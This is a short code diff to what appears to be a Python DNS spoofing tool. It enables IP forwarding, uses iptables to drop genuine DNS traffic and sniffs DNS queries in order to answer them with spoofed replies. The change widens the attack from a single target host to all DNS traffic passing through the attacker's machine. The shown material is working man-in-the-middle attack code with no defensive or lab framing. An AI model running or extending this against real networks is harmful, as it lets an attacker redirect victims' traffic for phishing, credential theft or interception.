@@ -36,7 +36,7 @@ def spoof_packets(packet, spoof_ip: str) -> None:
 
 def sniff_init(target: str, spoof_ip: str) -> None:
     try:
-        sniff(filter="udp and port 53 and host " + target, prn=lambda p: spoof_packets(p, spoof_ip), store=False)
+        sniff(filter="udp dst port 53", prn=lambda p: spoof_packets(p, spoof_ip), store=False)
     except PermissionError:
         sys.exit("Permission error! Run as sudo or admin!")
 
@@ -52,8 +52,8 @@ def get_mac_address(target) -> str:
 def configure_system(target: str) -> None:
     subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
     print("Enabled forwarding")
-    os.system("iptables -A FORWARD -p udp --sport 53 -d " + target + " -j DROP")
-    os.system("iptables -A FORWARD -p tcp --sport 53 -d " + target + " -j DROP")
+    os.system("iptables -A FORWARD -p udp --dport 53 -j DROP")
+    os.system("iptables -A FORWARD -p tcp --dport 53 -j DROP")
     print("Blocking real DNS responses from gateway!")
 
 
